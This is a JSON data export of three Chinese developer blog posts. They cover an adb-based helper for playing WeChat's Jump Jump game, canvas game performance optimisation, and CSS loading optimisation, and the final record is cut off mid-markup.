{"_id":{"$oid":"5a4b76338b69bb25d83da3d4"},"id":"5a46669c51882512ae12fa9a","author":{"$oid":"5a4b76338b69bb25d83da3cf"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"教你用NodeJs+express玩跳一跳","meta":{"likeCount":0},"tag":["Express"],"comment":[],"shortContent":"2017年12月28日下午，微信发布了 6.6.1 版本，加入了「小游戏」功能，并提供了官方 demo「跳一跳」。","content":"\u003cp\u003e2017年12月28日下午，微信发布了 6.6.1 版本，加入了「小游戏」功能，并提供了官方 demo「跳一跳」。\n插画风格的益智游戏，玩家可以通过按压屏幕时间的长短来控制这个「小人」跳跃的距离…\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/WoeOm/you_jump_i_jump\"\u003ehttps://github.com/WoeOm/you_jump_i_jump\u003c/a\u003e\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003ejump one jump\u003c/h1\u003e\n\u003cp\u003e微信小游戏 跳一跳（jump one jump）node js express\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e使用方法\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e1. 电脑安装adb   ===\u0026gt; brew install android-platform-tools\n   \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e you_jump_i_jump\n   npm install\n   npm start\n   浏览器打开 localhost:3000\n2. 打开安卓手机的usb调试模式并授权连接的电脑\n3. 如果是小米手机，在USB调试下方有``USB调试（安全设置）``打开允许模拟点击 \n4. 打开微信跳一跳，并点击开始\n5. 在弹出的窗口中先点击小人底部适当位置，然后再点想要跳的箱子的位置即可完成\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e测试环境\u003c/h2\u003e\n\u003cp\u003enode 8\nchrome\nmacOS\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e截图\u003c/h2\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"img\" src=\"https://user-gold-cdn.xitu.io/2017/12/30/160a302162cbfadb?w=1230\u0026amp;h=1640\u0026amp;f=jpeg\u0026amp;s=119760\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e问题\u003c/h2\u003e\n\u003cp\u003e提issue/pr\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e结语\u003c/h2\u003e\n\u003cp\u003e玩的开心\u003c/p\u003e\n","buildTime":"1514894893.4997","__v":0}
{"_id":{"$oid":"5a4b76338b69bb25d83da3d5"},"id":"5a48d0496fb9a0451b04e54f","author":{"$oid":"5a4b76338b69bb25d83da3c4"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/31/160ac700df384788?w=228\u0026h=125\u0026f=jpeg\u0026s=7193"],"screenShot":null}],"title":"原生canvas游戏性能优化","meta":{"likeCount":0},"tag":["前端","JavaScript","Canvas"],"comment":[],"shortContent":"随着微信小游戏的推出，其全面支持以往的H5游戏开发，微信借小游戏的社交方式彻底激活小程序。同样的，也算是重新吹起了H5游戏的风口。 可以预见的是，借助小游戏的风，前端游戏开发这一分支也会燃起来了。在游戏开发中，最令人难受的也许就是性能优化了吧。本人在整理过往几次游戏开发的经历中…","content":"\u003cp\u003e随着微信小游戏的推出，其全面支持以往的H5游戏开发，微信借小游戏的社交方式彻底激活小程序。同样的，也算是重新吹起了H5游戏的风口。\u003c/p\u003e\n\u003cp\u003e可以预见的是，借助小游戏的风，前端游戏开发这一分支也会燃起来了。在游戏开发中，最令人难受的也许就是性能优化了吧。本人在整理过往几次游戏开发的经历中，总结了一些常被忽视的优化小措施，与诸君分享。\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e针对游戏性能优化，首先，我们要知道我们优化的目标是什么？往往我们觉得性能优化很难，是因为我们不确定优化目标是什么，针对什么进行优化。\u003c/p\u003e\n\u003cp\u003e在我看来，性能优化的实质，实际上就是尽可能的减少等待时间和内存使用。\u003c/p\u003e\n\u003cp\u003e有了目标有好办了，接下来，我们需要知道我们通过优化哪些目标可以减少代码执行和内存使用。我粗略的分为了3个方面：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCanvas，原生canvas游戏，首要目标自然就是canvas\u003c/li\u003e\n\u003cli\u003e内存使用，果7之前safari运行内存只有100M，滥用内存直接给你强制锁死\u003c/li\u003e\n\u003cli\u003e多线程，两条腿走路肯定比一条腿快多了啊\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003eCanvas\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e离屏canvas\u003c/h3\u003e\n\u003cp\u003e场景：针对需要大量使用且绘图繁复的静态场景\u003c/p\u003e\n\u003cp\u003e实现：对象内放置一个私有canvas，初始化时将静态场景绘制完备，需要时直接拷贝内置canvas的图像即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e//每一帧重绘时\nsetInterval(function () {\n\n    context.fillRect(x,y,width,height)\n    context.arc(x,y,r,sA,eA)\n    context.strokeText('hehe', x, y)\n    \n}, 1000/60)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e设置离屏canvas\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003elet background = {\n    width: 400,\n    height: 400,\n    canvas: document.createElement('canvas'),\n    init: () =\u0026gt; {\n        let self = this\n        let ctx = self.canvas.getContext('2d')\n        \n        self.canvas.width = self.width\n        self.canvas.height = self.height\n\n        ctx.fillRect(x,y,width,height)\n        ctx.arc(x,y,r,sA,eA)\n        ctx.strokeText('hehe', x, y)\n\n    }\n    \n}\n\nbackground.init()\n\nsetInterval(() =\u0026gt; {\n\n    context.drawImage(background.canvas, background.width, background.height, 0, 0);\n    \n}, 1000/60)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e不设置离屏canvas的情况下，每帧绘制会调用3次绘图api；设置离屏canvas后，每帧只用调用一次api。\u003c/p\u003e\n\u003cp\u003e实质：减少调用api的次数，减少代码执行语句，从而减少每帧渲染时间，从而提高动画流程度。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e状态修改\u003c/h3\u003e\n\u003cp\u003e场景：针对需要频繁修改canvas对象的渲染状态 （fillStyle, strokeStyle ...）\u003c/p\u003e\n\u003cp\u003e实现：按canvas状态分别绘制，而不是按对象进行绘制\u003c/p\u003e\n\u003cp\u003e混合绘制\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003efor (let i = 0; i \u0026lt; line.length; i++) {\n\n    let e = line[i]\n\n    context.fillStyle = i % 2 ? '#000': '#fff'\n\n    context.fillRect(e.x, e.y, e.width, e.height)\n\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e不同状态分别绘制：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003econtext.fillStyle = '#000'\n\nfor (let i = 0; i \u0026lt; line.length / 2 - 1; i++) {\n\n    let e = line[i * 2 + 1]\n\n    context.fillRect(e.x, e.y, e.width, e.height)\n\n}\n\ncontext.fillStyle = '#fff'\n\nfor (let i = 0; i \u0026lt; line.length / 2 - 1; i++) {\n\n    let e = line[i * 2]\n    \n    context.fillRect(e.x, e.y, e.width, e.height)\n\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e前后比较看，虽然循环次数没变，但循环内调用的语句变少了，即不在循环内修改canvas状态了。\u003c/p\u003e\n\u003cp\u003e实质：减少canvas api的调用，不用在每次根据对象属性去修改canvas的状态，而是将具有相同状态的对象提出，批量渲染。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e分层和局部重绘\u003c/h3\u003e\n\u003cp\u003e场景：针对场景中大背景变化缓慢，而角色的状态变换频繁\u003c/p\u003e\n\u003cp\u003e实现：将场景按状态变换快慢进行层次划分，设置不同的透明度和z-index进行层级叠加。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/31/160ac700df384788?w=228\u0026amp;h=125\u0026amp;f=jpeg\u0026amp;s=7193\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e实质：通过分层，对连续帧中的相同场景不重复渲染，减少渲染所需的canvas api的调用。\u003c/p\u003e\n\u003cp\u003e但在微信小游戏中，本方法不能使用，因为微信小游戏中有全局唯一canvas，其他canvas都是离屏canvas，不能显示。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003erequestAnimationFrame\u003c/h3\u003e\n\u003cp\u003e这个不存在什么场景，就是一把梭，无脑直接上RAF，别再setInterval了。\u003c/p\u003e\n\u003cp\u003e简单点说，RAF是浏览器根据页面渲染的情况，自行选择下一帧绘制的时机。\u003c/p\u003e\n\u003cp\u003e但是有一个tip需要注意，RAF不管理回调函数，即在RAF回调被执行前，如果RAF多次调用，其回调函数也会多次调用。所以需要做好防抖节流。不然会导致RAF的回调函数在同一帧中重复调用，造成不必要的计算和渲染的消耗。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003econst animation = timestamp =\u0026gt; console.log('animation called at', timestamp)\n\nwindow.requestAnimationFrame(animation)\nwindow.requestAnimationFrame(animation)\n\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e内存优化\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e对象池\u003c/h3\u003e\n\u003cp\u003e场景：针对游戏中需要频繁更新和删除 的角色\u003c/p\u003e\n\u003cp\u003e实现：对象池维护一个装着空闲对象的池子，如果需要对象的时候，不是直接new，而是从对象池中取出，如果对象池中没有空闲对象，则新建一个空闲对象。\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003econst __ = {\n  poolDic: Symbol('poolDic')\n}\n\n/**\n * 简易的对象池实现\n * 用于对象的存贮和重复使用\n * 可以有效减少对象创建开销和避免频繁的垃圾回收\n * 提高游戏性能\n */\nexport default class Pool {\n  constructor() {\n    this[__.poolDic] = {}\n  }\n\n  /**\n   * 根据对象标识符\n   * 获取对应的对象池\n   */\n  getPoolBySign(name) {\n    return this[__.poolDic][name] || ( this[__.poolDic][name] = [] )\n  }\n\n  /**\n   * 根据传入的对象标识符，查询对象池\n   * 对象池为空创建新的类，否则从对象池中取\n   */\n  getItemByClass(name, className) {\n    let pool = this.getPoolBySign(name)\n\n    let result = (  pool.length\n                  ? pool.shift()\n                  : new Object()  )\n\n    return result\n  }\n\n  /**\n   * 将对象回收到对象池\n   * 方便后续继续使用\n   */\n  recover(name, instance) {\n    this.getPoolBySign(name).push(instance)\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e实质：减少内存的使用。每次创建一个对象，都需要分配一点内存，而由于浏览器的回收机制，导致会有大量无用的对象的累加，白白消耗大量的内存。\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e多线程\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003eWorker\u003c/h3\u003e\n\u003cp\u003e场景：针对需要进行大量计算任务\u003c/p\u003e\n\u003cp\u003e实现：使用worker单独开启线程进行并行计算，主线程仍执行自己的任务。\u003c/p\u003e\n\u003cp\u003e实质就是并行计算，避免进程堵塞。任务计算需要的时间是不会减少的，形象点来说就是从一条腿走路变成两条腿走路\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e//main.js\n//创建worker线程\nlet worker = new Worker('worker.js')\n//监听worker线程的返回事件\nworker.onmessage = (e) =\u0026gt; {\n    //e worker线程的返回对象\n}\n//发送消息\nworker.postMessage(obj)\n\n//worker.js\n//监听主线程的执行请求\nonmessage = (e) =\u0026gt; {\n    //执行对象e\n    \n    postMessage(result)\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e实质：并行计算，可以认为计算任务与主线程工作是异步的，互不干扰。因为是将计算任务全部交给worker，所有计算时间是不会减少的。\u003c/p\u003e\n\u003cp\u003e对象池不仅可以针对对象，还可以针对worker进行线程池的管理，有兴趣的朋友可以试试。\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e其实除了上述3个方面，还有一个非常重要的优化目标，那就是网络优化，但这也是我们常说的浏览器性能优化的终点内容，所以关于网络优化，各位就请移步其他大神的文章，我也就不再卖弄我那一点三脚猫技术了。各位朋友有什么其他的优化措施的，欢迎交流。\u003c/p\u003e\n","buildTime":"1514894423.0932","__v":0}
{"_id":{"$oid":"5a4b76338b69bb25d83da3d6"},"id":"5a461f006fb9a0450408358f","author":{"$oid":"5a4b76338b69bb25d83da3c7"},"imageCache":[{"imageUrlArray":["https://camo.githubusercontent.com/d2dcf890d01354d62b2210809b5a363d10e1cc4e/687474703a2f2f6f3830726f6e776c752e626b742e636c6f7564646e2e636f6d2f69636f6e2d72696768742e6a706567","https://camo.githubusercontent.com/cac54fb124b239c9a3a44d54f2d714b33c6d2c9f/687474703a2f2f6f3830726f6e776c752e626b742e636c6f7564646e2e636f6d2f69636f6e2d77726f6e672e6a706567"],"screenShot":null}],"title":"现代浏览器性能优化-CSS篇","meta":{"likeCount":0},"tag":["CSS","JavaScript","浏览器","前端"],"comment":[],"shortContent":"我来填坑了，CSS篇终于写出来了，如果你没看过前面的JS篇，可以在这里观看。 以下面这段HTML为例，解释一遍CSS加载解析的过程。 浏览器自上而下读取HTML文档，当发现headStyle.css的时候，停止Parser HTML，开始下载headStyle.css，解析he…","content":"\u003cp\u003e我来填坑了，CSS篇终于写出来了，如果你没看过前面的JS篇，可以\u003ca target=\"_blank\" href=\"https://github.com/GeoffZhu/geoffzhu.github.io/issues/2\"\u003e在这里观看\u003c/a\u003e。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e众所周知，CSS的加载会阻塞浏览器渲染或是引起浏览器重绘，目前业界普遍推荐把CSS放到\u003ccode\u003e\u0026lt;head\u0026gt;\u003c/code\u003e中，防止在CSS还没加载完，DOM就已经绘制出来了，造成CSS加载完成后的重绘。那在现代浏览器中我们有没有办法提高首屏渲染速度那？\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e你是不是经常在第一次打开某个网站的时候看到这种情况，本来的页面是这样的\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://camo.githubusercontent.com/d2dcf890d01354d62b2210809b5a363d10e1cc4e/687474703a2f2f6f3830726f6e776c752e626b742e636c6f7564646e2e636f6d2f69636f6e2d72696768742e6a706567\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e实际上刚加载出来的是这样的\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://camo.githubusercontent.com/cac54fb124b239c9a3a44d54f2d714b33c6d2c9f/687474703a2f2f6f3830726f6e776c752e626b742e636c6f7564646e2e636f6d2f69636f6e2d77726f6e672e6a706567\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e字体文件没加载出来，或者加载的太慢了\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e理解CSS解析过程\u003c/h2\u003e\n\u003cp\u003e以下面这段HTML为例，解释一遍CSS加载解析的过程。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e\u0026lt;!-- headStyle.css中存在字体文件webfont.woff2 --\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/css\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"/headStyle.css\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003eText\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ep\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/css\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"/bodyEndStyle.css\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e浏览器自上而下读取HTML文档，当发现headStyle.css的时候，停止Parser HTML，开始下载headStyle.css，解析headStyle.css的过程中发现字体文件webfont.woff2，开始下载webfont.woff2，并继续解析css生成CSSStyleSheet。解析完毕后，继续Parser HTML，当发现p标签时，会将p标签结合当前的CSSStyleSheet展示出来，此时用户屏幕中已经有p标签的内容了。当浏览器发现bodyEndStyle.css时，就会下载headStyle.css，解析CSS，然后更新CSSStyleSheet，这时会引起一次重绘。当字体下载完毕的时候也会引起一次重绘。\u003c/p\u003e\n\u003cp\u003e这个过程中，有两个非常严重的问题。一、如果headStyle.css文件很大，浏览器需要解析很多行CSS后才能还有个字体文件需要下载，其实此时已经很晚了，字体下载时间稍长一点，就会出现我前面截图提到的问题。二、bodyEndStyle.css中如果存在p标签对应的样式，那p标签的样式会在bodyEndStyle.css解析完成后，改变一次样式，很影响体验。\u003c/p\u003e\n\u003cp\u003e如何解决这些问题那？其中也会用到一些JS篇中提到的点，如果没看过，建议先看看。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e优化核心依旧是减少下载时间\u003c/h2\u003e\n\u003cp\u003eJS篇中的预先解析DNS（dns-prefetch）依旧适用，提前解析CSS文件所在域名的DNS。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003ePreload\u003c/h4\u003e\n\u003cp\u003e因为CSS已经在head中，我们不需要为css加preload属性了，但是css中用到的字体文件，一定要在所有css之前proload上。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"preload\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"/webfont.woff2\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eas\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"font\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e首页CSS内联，非必要CSS异步加载\u003c/h4\u003e\n\u003cp\u003e首页用到的CSS内联写在\u003ccode\u003e\u0026lt;head\u0026gt;\u003c/code\u003e中，其余CSS均采用异步加载，可以采用这种自己实现的加载CSS的方法，在合适的需要时加载需要的css\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eLoadStyle\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003eurl\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.createStyleSheet(url)\n  } \u003cspan class=\"hljs-keyword\"\u003ecatch\u003c/span\u003e(e) {\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e cssLink = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.createElement(\u003cspan class=\"hljs-string\"\u003e'link'\u003c/span\u003e);\n    cssLink.rel = \u003cspan class=\"hljs-string\"\u003e'stylesheet'\u003c/span\u003e;\n    cssLink.type = \u003cspan class=\"hljs-string\"\u003e'text/css'\u003c/span\u003e;\n    cssLink.href = url;\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e head = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementsByTagName(\u003cspan class=\"hljs-string\"\u003e'head'\u003c/span\u003e)[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e];\n    head.appendChild(cssLink)\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果你使用webpack，那就更轻松了，使用import函数，大致如下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 在a.js模块中直接引入css\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'style.css'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 在需要a.js模块的地方\u003c/span\u003e\nimprot(\u003cspan class=\"hljs-string\"\u003e'path-of-a.js'\u003c/span\u003e).then(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003emodule\u003c/span\u003e =\u0026gt;\u003c/span\u003e {})\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ewebpack打包后，其实是把style.css打包进了a.js，在异步加载a.js的时候，会将style.css中的代码插入\u003ccode\u003ehaed\u003c/code\u003e标签中。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e终极完美结构\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003emeta\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003echarset\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"utf-8\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003eFaster\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003etitle\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"dns-prefetch\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//cdn.cn/\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"preload\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//cdn.cn/webfont.woff2\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eas\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"font\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"preload\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//cdn.cn/Page1-A.js\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eas\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"script\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"preload\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//cdn.cn/Page1-B.js\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eas\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"script\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"prefetch\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//cdn.cn/Page2.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"prefetch\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//cdn.cn/Page3.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003elink\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003erel\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"prefetch\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ehref\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//cdn.cn/Page4.js\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n  \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003estyle\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/css\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"css\"\u003e\n    \u003cspan class=\"hljs-comment\"\u003e/* 首页用到的CSS内联 */\u003c/span\u003e\n  \u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003estyle\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ehead\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ebody\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003escript\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003esrc\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"//cdn.cn/Page1-A.js\"\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003edefer\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"undefined\"\u003e\u003c/span\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan 